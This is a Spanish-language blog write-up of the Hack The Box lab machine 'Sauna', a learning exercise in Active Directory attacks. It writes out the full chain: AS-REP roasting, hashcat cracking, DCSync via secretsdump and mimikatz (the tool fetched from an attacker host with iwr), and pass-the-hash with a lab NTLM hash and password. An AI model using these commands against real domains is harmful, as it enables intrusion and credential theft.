---
layout: single
title: Hack The Box - Sauna
excerpt: "Sauna es una máquina de HTB de dificultad fácil, mediante la cual pueden practicarse técnicas clave de explotación de **Directorio Activo** que pueden presentarse en ambientes reales como ataques a kerberos (ASREPRoast), enumeración de credenciales, uso de Bloodhound para enumerar  vías potenciales para escalar privilegios, ataque DCsync, Pass-The-Hash, etc."
date: 2022-05-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-sauna/sauna_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - Active Directory
tags:
  - asrep
  - crackmapexec
  - bloodhound
  - dcsync
  - secretsdump
  - mimikatz
  - pass-the-hash
---

<style>
body
{
  margin: 0;
  padding: 0;
}

.glitch
  {
    position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-sauna/sauna_logo.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
 }

.glitch:before
  {
    content: '';
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url("/assets/images/htb-writeup-sauna/sauna_logo.png");
    background-size: cover; /* contain for split effect */
    opacity: .5;
    mix-blend-mode: hard-light;
    animation: glitch2 10s linear infinite;
  }

.glitch:hover:before
{
  animation: glitch1 1s linear infinite;
}

@keyframes glitch1
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 5px 0;
  }
  20%
  {
    background-position: -5px 0;
  }
  30%
  {
    background-position: 15px 0;
  }
  40%
  {
    background-position: -5px 0;
  }
  50%
  {
    background-position: -25px 0;
  }
  60%
  {
    background-position: -50px 0;
  }
  70%
  {
    background-position: 0 -20px;
  }
  80%
  {
    background-position: -60px -20px;
  }
  81%
  {
    background-position: 0 0;
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(360deg);
  }
}

@keyframes glitch2
{
  0%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  10%
  {
    background-position: 15px 0;
  }
  15%
  {
    background-position: -15px 0;
  }
  20%
  {
    filter: hue-rotate(360deg);
  }
  25%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
  100%
  {
    background-position: 0 0;
    filter: hue-rotate(0deg);
  }
}

@media (max-width: 767.5px) {

.glitch{
position: relative;
    width: 50%;
    height: 50vh;
    background-image:url("/assets/images/htb-writeup-sauna/sauna_logo.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


@media (max-width: 575.5px) { 

.glitch{
position: relative;
    width: 50%;
    height: 25vh;
    background-image:url("/assets/images/htb-writeup-sauna/sauna_logo.png");
    background-size: cover;
    margin-left: auto;
  margin-right: auto;
}
}


</style>
<body>
    <div class="glitch">  
    </div>
</body>




<!--<img  src="/assets/images/htb-writeup-sauna/sauna_logo.png" style="width:75%; border-radius:10px; display: block; margin-left: auto;  margin-right: auto;">
-->

## Resumen

Sauna es una máquina de HTB de dificultad fácil, mediante la cual pueden practicarse técnicas clave de explotación de **Directorio Activo** que pueden presentarse en ambientes reales como ataques a kerberos (ASREPRoast), enumeración de credenciales, uso de Bloodhound para enumerar  vías potenciales para escalar privilegios, ataque DCsync, Pass-The-Hash, etc.

## Enumeración

Comenzaré identificando que puertos TCP están abiertos en la máquina objetivo, ejecutando un escaneo de puertos “SYN SCAN” a los 65535 puertos de la máquina mediante la herramienta nmap.
<br>**Comando:** nmap -sS 10.10.10.175 -p- -Pn -n -vvv -T5 --min-rate 5000 -oA TCP_SCAN_10.10.10.175

<img  src="/assets/images/htb-writeup-sauna/SYN_SCAN_TCP.png" style="width:75%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Como resultado se identificaron bastantes puertos abiertos, comunes en un controlador de dominio, adicionalmente, puede intuirse que el sistema operativo de la máquina es **Windows** debido al TTL obtenido en el resultado del escaneo (127) en caso de no estar personalizado.
Posteriormente realice la enumeración de versiones para todos los puertos abiertos identificados con el objetivo de obtener mayor información de las tecnologías ejecutándose en cada uno de ellos.
<br>**Comando:** <br>nmap -sV 10.10.10.175 -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49674,49677,49689,49696 -vvv -Pn -n -oA TCP_SCAN_SV_10.10.10.175

<img  src="/assets/images/htb-writeup-sauna/nmap_SV.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Adicionalmente, ejecuté **crackmapexec smb 10.10.10.175** para obtener más detalles acerca del sistema operativo, la arquitectura y el nombre de dominio de la máquina victima.

<img  src="/assets/images/htb-writeup-sauna/CME.png" style="width:100%; border-radius:2px; display: block; margin-left: auto;  margin-right: auto;">

## Enumeración SMB 

Enumere el servicio smb con herramientas como smbclient y smbmap para validar si existían recursos compartidos a nivel de red a los cuales tuviera acceso, sin embargo no hubo éxito.

<img  src="/assets/images/htb-writeup-sauna/SMB.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

## Enumeración WEB

El sitio web que tiene alojado la máquina representa a un banco.

<img  src="/assets/images/htb-writeup-sauna/web_site.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Al encontrarse con un sitio web es recomendable saber la tecnología que están ocupando en dicho sitio, por lo cual ejecute **whatweb** la cual es una herramienta similar a **wappalyzer** para poder conocer la tecnología empleada.

<img  src="/assets/images/htb-writeup-sauna/whatweb.png" style="width:100%; border-radius:2px; display: block; margin-left: auto;  margin-right: auto;">

Mediante la consulta anterior obtuve información como el servidor ejecutándose en este caso un servidor IIS 10.0. <br>
Posteriormente, navegando en el sitio web como un usuario normal tratando de identificar algo de lo cual pueda aprovecharme como atacante identifique algunos posibles usuarios, por lo cual hice una lista de ellos agregándolos con un formato: **{primer inicial del nombre}{apellido}** debido a que es algo que las empresas comúnmente hacen con sus empleados.

<img  src="/assets/images/htb-writeup-sauna/web_users.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

<img  src="/assets/images/htb-writeup-sauna/list_users.png" style="width:90%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

## Ataque AS-REP Roasting (Kerberos) 

Una vez con la lista de usuarios potenciales, probaré un ataque ASP-REP roasting  ya que aunque no conozca la contraseña de ninguno de los posibles usuarios si algunos de ellos tiene configurado la opción **DONT_REQ_PREAUTH**  es decir que no requiera autenticación previa de Kerberos puede obtenerse un hash.
<br>Para poder realizar el ataque utilizare el script GetNPUsers.py de impacket.<br>
**Comando:** python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip 10.10.10.175

<img  src="/assets/images/htb-writeup-sauna/asrep.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Al revisar el archivo de salida del comando anterior obtenemos un hash para el usuario **fsmith**

<img  src="/assets/images/htb-writeup-sauna/hash.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Ahora que tengo un hash de un usuario valido el siguiente paso es romper ese hash para obtener la contraseña en claro, para esto pueden usarse herramientas como **john the ripper** o **hashcat**, en este caso usare hashcat  haciendo uso del diccionario rockyou.txt.
<br>
**Comando:** hashcat --force -m 18200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt

<img  src="/assets/images/htb-writeup-sauna/pass.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

El siguiente paso es validar las credenciales obtenidas utilizando crackmapexec en los servicios smb y winrm.

<img  src="/assets/images/htb-writeup-sauna/credentials.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

En vista de que las credenciales son validas iniciare sesión por winrm utilizando la herramienta evil-winrm para obtener una shell en la máquina victima como el usuario fsmith.

<img  src="/assets/images/htb-writeup-sauna/shell.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Una vez dentro de la máquina puede visualizar la bandera de usuario.

<img  src="/assets/images/htb-writeup-sauna/flag.png" style="width:75%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

## Escalada de privilegios fsmith --> svc_loanmgr

Una vez que gane acceso a la máquina cargue el script WinPEAS.exe (https://github.com/carlospolop/PEASS-ng/releases/tag/20220417) utilizando la opción upload  de winrm  para enumerar el sistema en busca de vías potenciales para escalar privilegios, convertirnos en otro usuario o bien obtener información sensible del sistema.

<img  src="/assets/images/htb-writeup-sauna/winpeas.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

El resultado del script revela la contraseña en claro del usuario **svc_loanmanager**.

<img  src="/assets/images/htb-writeup-sauna/svc_pass.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Utilizando el comando net users corrobore que dicho usuario existe en la máquina unicamente con un ligero cambio en el nombre **svc_loanmgr** así que nuevamente valide las credenciales obtenidas con crackmapexec.

<img  src="/assets/images/htb-writeup-sauna/net_user.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

<img  src="/assets/images/htb-writeup-sauna/cme_svc.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Una vez que descubrí que las credenciales son validas en la maquina inicie, sesión con el usuario sv_loanmgr mediante evil-winrm.
	
<img  src="/assets/images/htb-writeup-sauna/shell_svc.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

## Escalada de privilegios
Para enumerar información del directorio activo y poder visualizar en formato gráfico vías potenciales para escalar privilegios ejecutare la herramienta **bloodhound**.
<br>
**Instalación:**
<br>
- apt install neo4j bloodhound -y 

Una vez instalado ejecutare la base de datos para que se sincronice con bloodhound con el **comando:** neo4j console, esto levantara un servicio en el puerto 7474 del locahost donde se tendrán que configurar las credenciales para poder acceder a bloodhound.

<img  src="/assets/images/htb-writeup-sauna/console_neo4j.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Las credenciales por defecto son **neo4j:neo4j** y una vez que ingresas lo ideal es cambiar dicha contraseña ya que serán las credenciales para ingresar a bloodhound.

Para poder visualizar gráficamente todas las vías potenciales para escalar privilegios cargare y ejecutare el script **Sharphound.ps1** en la máquina victima el cual recolectara cierta información relevante almacenándola en un archivo .zip

<img  src="/assets/images/htb-writeup-sauna/sharphound.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Posteriormente descargare el archivo zip a mi máquina de atacante y lo cargare en bloodhound.<br> Una vez en bloodhound Podemos realizar consultas como saber que usuarios son AS-REP Roaestables, que usuarios son Kerberoastebales, cual es la forma más rápida para convertirte en usuario administrador del dominio, etc.
<br>
Al realizar una consulta DCSync para ver si algún usuario existente puede ejecutar un ataque DCSync. Revelo que el usuario svc_loanmgr tiene los privilegios **GetCahngesAll** y **GetChanges** lo cual permite ejecutar un ataque DCSync, es decir que dicho usuario tiene el privilegio de extraer el hash del usuario administrador.

<img  src="/assets/images/htb-writeup-sauna/bloodhound.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Al hacer click derecho y seleccionando la opcion de **ayuda**, bloodhound brinda mas información sobre como ejecutar de dicho ataque.

<img  src="/assets/images/htb-writeup-sauna/blood_info.png" style="width:75%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

## DCSync - secretsdump
Una forma de hacer un ataque DCSYnc es usando la utilidad **secretsdump** de impacket, esta es una forma menos intrusiva aunque genera tráfico en la red.<br>
**Comando:**<br>
impacket-secretsdump -just-dc-ntlm EGOTISTICAL-BANK.LOCAL/svc_loanmgr:Moneymakestheworldgoround\!@10.10.10.175

<img  src="/assets/images/htb-writeup-sauna/secretsdump.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

## DCSync - Mimikatz

Otra forma de realizar este ataque es utilizando mimikatz así que cargaré mimikatz.exe en la máquina comprometida levantando un servidor temporal con python en mí máquina de atacante y transfiriéndolo a la máquina víctima con el siguiente comando:
**iwr -uri http://10.10.14.22:1234/mimikatz.exe -OutFile mimikatz.exe**

<img  src="/assets/images/htb-writeup-sauna/mimikatz.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Una vez que mimikatz está cargado ejecutare el siguiente comando para realizar el ataque DCSync.
**C:\Users\svc_loanmgr\Documents\mimikatz.exe 'lsadump::dcsync /domain:egotistical-bank.local /user:Administrator' exit**

<img  src="/assets/images/htb-writeup-sauna/mimikatz_hash.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

## Pass-The-Hash

Ahora que tengo el hash NTLM del administrador podría tartar de romper la contraseña por fuerza bruta en caso de que sea débil o bien hacer un **Pass-The-Hash** para tener una shell como administrador, en este caso utilizaré evil-winrm para hacerlo ejecutando:
<br>
**evil-winrm -u 'Administrator' -H '823452073d75b9d1cf70ebdf86c7f98e' -i 10.10.10.175**

<img  src="/assets/images/htb-writeup-sauna/administrator.png" style="width:100%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">

Por último visualizar la bandera de administrador y Domain Controller comprometido :D!!

<img  src="/assets/images/htb-writeup-sauna/fadmin.png" style="width:80%; border-radius:5px; display: block; margin-left: auto;  margin-right: auto;">


